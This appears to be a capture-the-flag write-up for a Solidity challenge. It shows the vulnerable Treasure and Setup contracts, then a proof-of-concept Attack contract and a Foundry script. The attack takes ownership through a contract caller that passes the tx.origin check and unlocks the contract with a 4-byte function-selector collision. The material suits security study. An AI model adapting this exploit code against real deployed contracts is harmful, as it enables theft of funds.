# sign in

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Treasure {
    uint256 public treasureAmount;
    bool public unlocked;
    address public owner;
    uint256 public lockCounter;
    bytes32 private hiddenHash;

    constructor(uint256 _treasureAmount) {
        owner = msg.sender;
        treasureAmount = _treasureAmount;
    }

    modifier onlyEOA() {
        require(msg.sender == tx.origin, "Only EOAs allowed"); //只能eoa
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    function becomeOwner() external payable returns (address) {
        require(msg.value > treasureAmount, "don't ride for free"); //msg.value
        require(
            msg.sender != tx.origin,
            "The vassal of my appendage is not my appendage"
        );
        owner = msg.sender;
        return owner;
    }

    function setHiddenHash(string memory secret) external onlyOwner {
        hiddenHash = keccak256(bytes(secret));
    }

    function dummyCheck(uint256 x) public view returns (bool) {
        return (x % 42 == 0 && tx.gasprice < 1000000000);
    }

    function getHiddenKey(
        string calldata _string1,
        string calldata _string2
    ) external returns (bool) {
        require(msg.sender == owner, "only owner can set hidden key");
        require(
            keccak256(bytes(_string1)) != keccak256(bytes(_string2)),
            "No two leaves are alike"
        );

        bytes4 sig1 = bytes4(keccak256(bytes(_string1)));
        bytes4 sig2 = bytes4(keccak256(bytes(_string2)));

        if (sig1 == sig2) {
            unlocked = true;
        }

        lockCounter += 1;
        return unlocked;
    }

    function isLegitKey(bytes calldata key) public view returns (bool) {
        return key.length > 12 && key.length < 32;
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import {Treasure} from "./Treasure.sol";

contract Setup {
    Treasure public treasure;
    bool public solved;
    address internal deployer;

    constructor() payable {
        treasure = new Treasure(1 ether);
        deployer = msg.sender;
    }

    function isSolved() external returns (bool) {
        if (treasure.unlocked()) {
            solved = true;
        }
        return solved;
    }

    function getTreasure() external view returns (address) {
        return address(treasure);
    }

    function withdrawEther() external {
        require(msg.sender == deployer, "Only deployer can withdraw");
        payable(deployer).transfer(address(this).balance);
    }
}

```

# poc
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Treasure} from "./Setup.sol";

contract Attack {
    Treasure public treasure;
    string public a;

    constructor(address addr) {
        treasure = Treasure(addr);
    }

    function attack() external payable {
        treasure.becomeOwner{value: 1.1 ether}();
        treasure.setHiddenHash(a);
        treasure.getHiddenKey(
            "transferFrom(address,address,uint256)",
            "gasprice_bit_ether(int128)" //重点就是这个前四字节函数选择器碰撞,我是从之前做的靶场题wp里摘来的
        );
        require(treasure.unlocked() == true, "not unlocked");
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Script} from "forge-std/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {Attack} from "../src/Attack.sol";
import {Treasure} from "../src/Setup.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Treasure treasure = Treasure(
            0x20e8A6d2Ed794137bB7fEDC2A5991D1A8fCc4afE
        );
        Attack attack = new Attack(0x20e8A6d2Ed794137bB7fEDC2A5991D1A8fCc4afE);
        console.log("EOA balance:", address(msg.sender).balance);
        console.log("Treasure amount:", treasure.treasureAmount());
        attack.attack{value: 1.1 ether}();

        vm.stopBroadcast();
    }
}

```



> 更新: 2025-09-13 18:35:31  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/ynuw280yetwangoq>